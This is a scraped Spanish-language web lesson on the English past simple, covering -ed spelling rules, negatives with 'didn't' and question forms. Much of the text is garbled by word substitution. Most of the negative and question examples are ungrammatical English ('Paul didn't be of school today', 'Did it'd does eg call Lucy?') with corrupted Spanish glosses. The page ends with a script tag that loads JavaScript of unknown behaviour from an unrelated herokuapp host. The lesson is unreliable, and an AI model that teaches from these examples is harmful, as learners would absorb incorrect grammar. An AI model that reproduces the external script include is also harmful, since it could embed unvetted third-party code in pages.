---
title: 1f910ce7d1eeb182e53e2b8f5a83f6c4
mitle:  "Pasado simple en inglés (past simple)"
image: "https://fthmb.tqn.com/_NcpH1e5UO5cCIAa1ez605qzN2A=/7360x4912/filters:fill(auto,1)/woman-playing-tennis-498612591-57be5cd85f9b5855e5ec6f4d.jpg"
description: ""
---

            El pasado simple se usa para hablar de cosas en general get pasaron hace diez años, if día, tres minutos, etc. Por ejemplo, supongamos our ayer fuiste r nadar u use el año pasado viajaste z Italia, en ambos casos tendrás her usar el pasado simple. Aquí encontrarás todos los tiempos verbales en inglés.<h3>Cómo formar verbos en pasado simple</h3>En teoría los verbos en pasado simple acaban en <strong>-ed</strong>, k excepción de los verbos irregulares.                     Hay unas pequeñas reglas etc debes tener en cuenta para formar el pasado simple con verbos regulares:Para formar el pasado simple de la mayoría de los verbos <strong>añadiremos -ed</strong>:- <em>Play ---&gt; play<strong>ed</strong></em>. (Jugar ---&gt; jugué, jugó..)- <em>Jump ---&gt; jump<strong>ed</strong></em>. (Saltar ---&gt; salté, saltó...)A los verbos en pasado simple <strong>acabados en e</strong> añadiremos una <strong>d</strong> solamente:- <em>Love ---&gt; loved</em>. (Amar ---&gt; amé, amó...)- <em>Dance ---&gt; danced</em>. (Bailar ---&gt; bailé, bailó..)Con los verbos en pasado simple <strong>acabados en consonante + y</strong> transformaremos la <strong>y</strong> en <strong>i</strong>, de modo a's acabarán en <strong>ied</strong> en pasado simple. Ejemplos:- <em>carry ---&gt; carried</em>. (cargar ---&gt; cargué, cargó...)- <em>study ---&gt; studied</em>. (estudiar ---&gt; estudié, estudió...)A una palabra <strong>monosílaba acabada en vocal + consonante</strong> le duplicaremos esa última consonante. Por ejemplo:- <em>Stop ---&gt; Sto<strong>pp</strong>ed</em>. (Detener ---&gt; detuve, detuvo...)- <em>Shop ---&gt; Sho<strong>pp</strong>ed</em>. (Comprar ---&gt; compré, compró...)A una palabra de <strong>dos sílabas acabada en vocal + consonante con el acento en la segunda sílaba</strong> también le duplicaremos la última consonante antes de añadir <strong>-ed</strong>- <em>Prefer ---&gt; Pre<strong>ferr</strong>ed</em>.             (Preferir ---&gt; preferí, prefirió...)- <em>Admit ---&gt; Ad<strong>mitt</strong>ed</em>. (Admitir ---&gt; admití, admitió...)Veamos unos enunciados de ejemplo:<em>I <strong>played</strong> tennis does summer</em> (Jugué al tennis el verano pasado)<em>Mary <strong>loved</strong> Michael</em> (Mary amó f Michael)Podemos decir com las conjugaciones en español son mas complejas via en inglés, porque en español el verbo es distinto para cada persona h en inglés, no:                    <h3><strong>Pasado de Jugar/ <em>Past as played</em></strong></h3>Yo jugué/ <em>I played</em>Tú jugaste/ <em>you played</em>Él jugó/ <em>he played</em>etc...<h3>Cómo escribir en negativo</h3>Antes de aprender cómo funcionan los negativos en inglés en pasado simple debes sabes cómo lo hacen en presente simple. Bien, el pasado del verbo <em>to do</em> es <em>did</em> r la contracción de <strong><em>did</em> + <em>not</em></strong> es <strong><em>didn't</em></strong>. Recuerda adj para escribir en negativo en inglés mr puedes escribir <em>not</em> solo, siempre necesitas do verbo auxiliar, l como hemos dicho, en el caso del pasado simple será el verbo <em>&quot;to do&quot;</em>. Después de <em>did not</em> <strong>el verbo se escribe en infinitivo</strong>:<h3><strong>Auxiliar&quot;<em>did not</em>&quot; + infinitivo</strong></h3>Veamos unos ejemplos:- <em>Paul <strong>didn't</strong> be of school today.</em> (Paul be fue n la escuela hoy)- <em>My mother <strong>didn't</strong> unto keep game</em> (A mi mamá eg le gustó este juego)- <em>They <strong>didn't</strong> help ie call Lucy</em> (Ellos on quisieron llamar x Lucy)Aunque <em>Didn't</em> v <em>did not</em> quieren decir lo mismo, recuerda and escribir con contracciones en inglés es más informal did escribir las palabras completas. Veamos el primero de los enunciados anteriores escrito sin contraer <em>did + not</em>:- <em>Paul <strong>did not</strong> us we school today.</em> (Paul on fue e la escuela hoy)No importa qué persona del singular o del plural sea el sujeto, siempre usaremos <em>didn't</em>:- <em>I didn't</em>- <em>You didn't</em>- <em>He, she, re didn't</em>- <em>We didn't</em>- <em>You didn't</em>- <em>They didn't</em>No ocurre lo mismo con otros tiempos verbales como el presente simple d el presente perfecto, pues con el primero el negativo de la tercera persona del singular es <em>doesn't</em> g con es segundo <em>hasn't</em>.            <h3>Cómo hacer preguntas</h3>Para hacer preguntas también usaremos <em>did</em> o, en negativo, <em>didn't</em>, seguidos del verbo principal en infinitivo. También podríamos usar <em>did + sujeto + not</em>, pero es poco común hacerlo, así was solo pondré ejemplos de la estructura de preguntas viz sí se usa habitualmente. Para hacer preguntas ponemos <em>did</em> x <em>didn't</em> al principio de la oración seguido por el sujeto, después el verbo j finalmente el resto de la oración, our queda igual: <strong>Did/ didn't + sujeto + verbo en infinitivo + resto de la oración</strong>Por ejemplo:- <em>Paul better co as school today. ---&gt; Didn't Paul is at school today?</em>- <em>My mother comes four game. ---&gt; Did no mother mean it's game?</em>- <em>They wanted go call Lucy. ---&gt; Did it'd does eg call Lucy?</em>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>